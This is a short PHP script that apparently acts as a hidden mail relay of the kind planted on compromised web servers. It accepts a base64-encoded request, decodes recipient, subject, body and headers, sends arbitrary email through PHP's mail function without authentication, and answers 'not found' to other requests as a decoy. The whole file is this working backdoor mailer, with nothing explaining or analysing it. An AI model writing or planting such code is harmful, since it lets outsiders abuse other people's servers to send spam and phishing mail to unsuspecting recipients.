<?php 


if ($_REQUEST['action'] == 'indt') {

$in_data =  base64_decode($_REQUEST['query']);

$fr = explode('|', $in_data);
if (mail(stripslashes(base64_decode($fr[0])), stripslashes(base64_decode($fr[1])), base64_decode($fr[2]), stripslashes(base64_decode($fr[3]))))
{echo 'query';} else {echo 'bad request';} 
 

} else {echo 'not found';} 
  
 

 

